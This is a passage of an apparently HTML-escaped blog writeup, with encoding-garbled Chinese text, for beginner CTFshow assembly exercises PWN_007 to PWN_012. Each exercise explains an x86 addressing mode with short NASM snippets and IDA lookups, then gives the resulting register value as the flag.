&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š&lt;strong&gt;å¯„å­˜å™¨å¯»å€æ–¹å¼&lt;/strong&gt;ç»“æŸå&lt;code&gt;edxå¯„å­˜å™¨&lt;/code&gt;çš„å€¼ä¸ºï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_007%5cWelcome_to_CTFshow&#34; &gt;Welcome_to_CTFshow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_007%5cWelcome_to_CTFshow.asm&#34; &gt;Welcome_to_CTFshow.asm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æŒ‰ç…§ä¸Šè¿°æ–¹æ³•å»å¾—å‡ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ”¾å…¥IDAï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/24.png&#34;
	width=&#34;985&#34;
	height=&#34;95&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/24_hu_92bd39fab506337a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/24_hu_75d2f4fa5f54ead5.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1036&#34;
		data-flex-basis=&#34;2488px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¯„å­˜å™¨å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x36d&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; å°†0x36dèµ‹å€¼ç»™ebx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; å°†ebxçš„å€¼èµ‹å€¼ç»™edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æ‰€ä»¥ctfshow{0x36D}&lt;/p&gt;
&lt;h3 id=&#34;pwn_008&#34;&gt;PWN_008
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šç›´æ¥å¯»å€æ–¹å¼ç»“æŸåecxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_008%5cWelcome_to_CTFshow&#34; &gt;Welcome_to_CTFshow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_008%5cWelcome_to_CTFshow.asm&#34; &gt;Welcome_to_CTFshow.asm&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; ç›´æ¥å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;å½“ä½ ç¼–è¯‘åå‘ç°æ‰¾ä¸åˆ°åœ°å€[msg]ï¼Œç„¶åæˆ‘ä»¬å€’å›æ¥æ‰¾é¢˜ç›®çš„Welcome_to_CTFshowæ–‡ä»¶ï¼Œç”¨IDAï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/25.png&#34;
	width=&#34;721&#34;
	height=&#34;25&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/25_hu_5372def4240b6f53.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/25_hu_1d2087bdde9824cc.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2884&#34;
		data-flex-basis=&#34;6921px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ•…flag:ctfshow{0x80490E8}&lt;/p&gt;
&lt;p&gt;å…¶å®ä¸ç”¨å»è¿›è¡Œç¼–è¯‘çš„ï¼Œåœ¨é¢˜ç›®ç»™çš„æ–‡ä»¶å°±èƒ½åšï¼Œç¼–è¯‘å‡ºæ¥çš„å…¶å®å°±æ˜¯é¢˜ç›®ç»™çš„æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_009&#34;&gt;PWN_009
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š&lt;strong&gt;å¯„å­˜å™¨é—´æ¥å¯»å€&lt;/strong&gt;æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_009%5cWelcome_to_CTFshow&#34; &gt;Welcome_to_CTFshow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_009%5cWelcome_to_CTFshow.asm&#34; &gt;Welcome_to_CTFshow.asm&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;esi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/26.png&#34;
	width=&#34;650&#34;
	height=&#34;175&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/26_hu_db95f2c70775bfb6.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/26_hu_6e7577b16306137d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;371&#34;
		data-flex-basis=&#34;891px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä¸æ˜¯80490E8å“ˆåˆ«è¢«è¯¯å¯¼äº†ï¼Œè¿™æ˜¯&lt;strong&gt;è™šæ‹Ÿåœ°å€&lt;/strong&gt;å“¦&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»è·Ÿè¿›ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/27.png&#34;
	width=&#34;659&#34;
	height=&#34;25&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/27_hu_2f879014412c83d2.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/27_hu_a9abfa63d7183e7a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2636&#34;
		data-flex-basis=&#34;6326px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;dd 636C6557h&lt;/code&gt;&lt;/strong&gt;ï¼š&lt;code&gt;dd&lt;/code&gt; æ˜¯æ±‡ç¼–æŒ‡ä»¤ä¸­çš„ä¼ªæ“ä½œç¬¦ï¼Œæ„ä¸º â€œå®šä¹‰åŒå­—ï¼ˆdefine double wordï¼‰â€ï¼Œè¡¨ç¤ºåœ¨å½“å‰åœ°å€å¤„å­˜æ”¾ä¸€ä¸ª 4 å­—èŠ‚çš„æ•°å€¼ã€‚è¿™é‡Œå­˜æ”¾çš„æ•°å€¼æ˜¯ &lt;code&gt;636C6557h&lt;/code&gt;ï¼ˆåå…­è¿›åˆ¶ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;flag:ctfshow{0x636C6557}&lt;/p&gt;
&lt;h3 id=&#34;pwn_010&#34;&gt;PWN_010
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š&lt;strong&gt;å¯„å­˜å™¨ç›¸å¯¹å¯»å€&lt;/strong&gt;æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_010%5cWelcome_to_CTFshow&#34; &gt;Welcome_to_CTFshow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_010%5cWelcome_to_CTFshow.asm&#34; &gt;Welcome_to_CTFshow.asm&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†ecxåŠ ä¸Š4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†ecxæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/28.png&#34;
	width=&#34;845&#34;
	height=&#34;154&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/28_hu_e162f950e4f701a0.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/28_hu_fc64a86acf95c0c7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;548&#34;
		data-flex-basis=&#34;1316px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/29.png&#34;
	width=&#34;770&#34;
	height=&#34;110&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/29_hu_8e18458aaf2629b0.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/29_hu_265416ee1eefcac9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;700&#34;
		data-flex-basis=&#34;1680px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¿™é‡Œå°†msgçš„åœ°å€ï¼ˆ0x80490E8ï¼‰+ 4 å¤„æ‰€æ‰§å‘çš„åœ°å€çš„å€¼èµ‹ç»™eax&lt;/p&gt;
&lt;p&gt;4æ˜¯åè¿›åˆ¶çš„ï¼Œåœ°å€æ˜¯16è¿›åˆ¶çš„ï¼Œè®°å¾—è½¬æ¢ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;hex(0x80490E8+4)&amp;ndash;&amp;gt; 080490EC&lt;/p&gt;
&lt;p&gt;å¯¹åº”åœ°å€å¾—å€¼æ˜¯ome_to_CTFshow_PWN&lt;/p&gt;
&lt;p&gt;æ•…flag:ctfshow{ome_to_CTFshow_PWN}&lt;/p&gt;
&lt;h3 id=&#34;pwn_011&#34;&gt;PWN_011
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š&lt;strong&gt;åŸºå€å˜å€å¯»å€&lt;/strong&gt;æ–¹å¼ç»“æŸåçš„eaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_011%5cWelcome_to_CTFshow&#34; &gt;Welcome_to_CTFshow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_011%5cWelcome_to_CTFshow.asm&#34; &gt;Welcome_to_CTFshow.asm&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; åŸºå€å˜å€å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†2èµ‹å€¼ç»™edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; å°†ecx+edx*2æ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;åŒæ ·çš„ï¼Œæ”¾åˆ°IDAä¸Šæ‰¾è¿™ä¸ªåŸºå€å˜å€å¯»å€æ–¹å¼ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/30.png&#34;
	width=&#34;780&#34;
	height=&#34;60&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/30_hu_901c17825a17f8ed.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/30_hu_668a6173f2e3ecb2.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1300&#34;
		data-flex-basis=&#34;3120px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åŒå‡»ç‚¹dwordå»è·Ÿè¿›åˆ°åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/31.png&#34;
	width=&#34;820&#34;
	height=&#34;135&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/31_hu_15a7389171b58f28.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/31_hu_750b9884b38e7964.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;607&#34;
		data-flex-basis=&#34;1457px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è®¡ç®—æœ€ç»ˆä¹Ÿæ˜¯ [0x80490E8 + 2*2 ] = [0X80490EC]&lt;/p&gt;
&lt;p&gt;å…¶å®ä¹Ÿæ˜¯å’ŒPWN_010ä¸€æ ·ï¼šhex(0x80490E8+4)&lt;/p&gt;
&lt;p&gt;å°±æ˜¯è¯´hex(0x80490E8 + 2*2 )=0X80490ECï¼Œå¯¹åº”çš„æ˜¯â€œome_to_CTFshow_PWNâ€ã€‚&lt;/p&gt;
&lt;p&gt;flagï¼šctfshow{ome_to_CTFshow_PWN}&lt;/p&gt;
&lt;h3 id=&#34;pwn_012&#34;&gt;PWN_012
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼ç»“æŸåeaxå¯„å­˜å™¨çš„å€¼ä¸ºï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_012%5cWelcome_to_CTFshow&#34; &gt;Welcome_to_CTFshow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_012%5cWelcome_to_CTFshow.asm&#34; &gt;Welcome_to_CTFshow.asm&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; ç›¸å¯¹åŸºå€å˜å€å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†1èµ‹å€¼ç»™edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; å°†ecxåŠ ä¸Š8&lt;/span&gt;
